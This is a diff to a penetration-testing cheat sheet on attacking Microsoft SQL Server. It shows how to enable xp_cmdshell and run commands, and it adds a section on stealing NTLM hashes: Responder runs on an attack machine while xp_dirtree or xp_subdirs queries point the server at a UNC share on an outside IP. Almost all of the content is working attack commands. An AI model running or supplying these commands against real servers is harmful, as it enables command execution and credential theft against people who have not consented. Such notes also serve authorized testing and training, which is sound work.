@@ -43,11 +43,19 @@ impacket-psexec <user>:<password>@<IP>
 ```
 ## Attack
 ### SQL
-xp_cmdshell
+==xp_cmdshell
 ```powershell
 EXECUTE sp_configure 'show advanced options', 1
 RECONFIGURE
 EXECUTE sp_configure 'xp_cmdshell', 1
 RECONFIGURE
 xp_cmdshell 'whoami'
-
+```
+==Hash Stealing with xp_subdris or xp_dirtree
+Start Responder on Attack machine
+```powershell
+EXEC master..xp_dirtree '\\10.10.110.17\share\'
+or
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+```
+Collect hashes from responder
